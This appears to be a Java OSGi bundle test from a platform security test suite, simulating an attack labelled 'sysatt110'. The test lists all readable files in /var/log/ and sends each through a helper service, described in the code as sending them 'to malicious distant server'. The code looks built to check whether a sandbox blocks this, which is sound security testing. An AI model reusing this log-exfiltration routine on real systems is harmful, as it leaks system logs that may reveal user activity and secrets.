package org.osgi.security.sysatt110.test;

import org.osgi.framework.BundleContext;
import org.junit.Assert;
import org.junit.Test;
import org.osgi.framework.BundleActivator;

import org.osgi.security.util.api.Util;
import org.osgi.util.tracker.ServiceTracker;

import java.io.File;

/**
 * 
 **/

public class Activator implements BundleActivator
{
	private static BundleContext bundleContext;
	private ServiceTracker serviceRef;
    private Util util;
    private boolean succeed = false;

	static BundleContext getContext()
    {
		return bundleContext;
    }

	public void start(BundleContext context) throws Exception
  	{
  		Activator.bundleContext = context;
    }
  	
  	public void stop(BundleContext context) throws Exception
  	{
  		Activator.bundleContext = null;
    }
  	
	private void unregisteredService()
	{
  		util.stop(succeed);
	}
  	
  	@Test
    public void testSysatt110() throws Exception
    {
  		serviceRef = new ServiceTracker(getContext(), Util.class.getName(), null);
  		serviceRef.open();
  		util = (Util) serviceRef.waitForService(30000); 
  		Assert.assertNotNull(util);
  		
  		util.start("sysatt110","System log pertinent files hijacking","System log pertinent files hijacking, and sending of these files on the network to malicious distant server");
	    try
	    {
	    	util.sendCmd("sysatt110");
	    	File dir = new File("/var/log/");
	        File list[] ;
	        list = dir.listFiles();
	        Assert.assertNotNull("No access to /var/log/ directory", list);
	        for (int i=0; i<list.length; i++)
	        {
	        	if (list[i].isFile()&&list[i].canRead())
	        	{
	        		util.sendFile(list[i]);
	        	}
	        }
    	    succeed = true;
	        util.sendCmd("::done::");
	    }
	    catch (Exception e)
	    {
	        util.err(e);
	    }
  		Assert.assertTrue("Test failed", succeed);
	    unregisteredService();
    }
  	
  
}